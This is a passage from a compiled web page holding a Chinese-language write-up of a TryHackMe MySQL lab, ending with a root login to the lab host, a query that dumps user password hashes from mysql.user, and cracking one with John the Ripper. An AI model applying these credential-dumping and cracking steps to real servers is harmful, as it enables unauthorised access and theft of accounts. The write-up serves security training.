<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">|</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">_</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  Statistics:</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Performed</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> guesses</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> in</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 1</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> seconds,</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> average</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> tps:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.0</span></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">MAC</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> Address:</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> 02:62:79:23:FC:51</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (Unknown)</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="登陆mysql" tabindex="-1"><a class="header-anchor" href="#登陆mysql"><span>登陆mysql</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">sudo</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> apt</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> install</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> default-mysql-client</span></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">mysql</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -h</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 10.10.58.132</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -u</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> root</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;"> -p</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="查询数据库" tabindex="-1"><a class="header-anchor" href="#查询数据库"><span>查询数据库</span></a></h4><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">mysql</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> show databases;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">--------------------+</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| </span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">Database</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">           |</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">--------------------+</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| information_schema |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| mysql              |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| performance_schema |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| sys                |</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">--------------------+</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">4</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> rows</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> in</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> set</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">.</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">00</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> sec)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="查询mysql库中的表" tabindex="-1"><a class="header-anchor" href="#查询mysql库中的表"><span>查询<code>mysql</code>库中的表</span></a></h4><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">mysql</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> show tables;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">---------------------------+</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| Tables_in_mysql           |</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">---------------------------+</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| columns_priv              |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| db                        |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| ...                       |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| user                      |</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">---------------------------+</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="查询用户名和秘密的hash值" tabindex="-1"><a class="header-anchor" href="#查询用户名和秘密的hash值"><span>查询用户名和秘密的hash值</span></a></h4><div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">mysql</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> select</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> *</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> from</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> user;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">mysql</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">&gt;</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> select</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> User, authentication_string </span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">from</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> user;</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">------------------+-------------------------------------------+</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| User             | authentication_string                     |</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">------------------+-------------------------------------------+</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| </span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">root</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">             |                                           |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| </span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">mysql</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">.</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">session</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    | </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| </span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">mysql</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">.</span><span style="--shiki-light:#A65E2B;--shiki-dark:#C99076;">sys</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">        | </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| debian</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">sys</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">-</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">maint | </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| </span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">root</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">             | </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |</span></span>
<span class="line"><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">| carl             | </span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">*</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">EA031893AA21444B170FC2162A56978B8CEECE18 |</span></span>
<span class="line"><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">+</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#758575DD;">------------------+-------------------------------------------+</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">6</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> rows</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> in</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;"> set</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> (</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">.</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">00</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> sec)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="破解hash" tabindex="-1"><a class="header-anchor" href="#破解hash"><span>破解hash</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">john</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;">  hash.txt</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> </span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#998418;--shiki-dark:#B8A965;">...</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">doggie</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">           (carl)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后登陆<code>ssh</code>,并获取到<code>flag</code>...</p>`,46))])}const u=h(m,[["render",o]]),C=JSON.parse('{"path":"/penetration/fzp9ssfc/","title":"常见的网络服务_Mysql","lang":"zh-CN","frontmatter":{"title":"常见的网络服务_Mysql","createTime":"2024/11/27 07:21:31","permalink":"/penetration/fzp9ssfc/"},"headers":[],"readingTime":{"minutes":8.51,"words":2554},"git":{"updatedTime":1733322825000,"contributors":[{"name":"MikTu","username":"MikTu","email":"kali@bogon","commits":1,"avatar":"https://avatars.githubusercontent.com/MikTu?v=4","url":"https://github.com/MikTu"}]},"filePathRelative":"notes/penetration/1.tryhackme/12.Network_MySQL.md"}');export{u as comp,C as data};
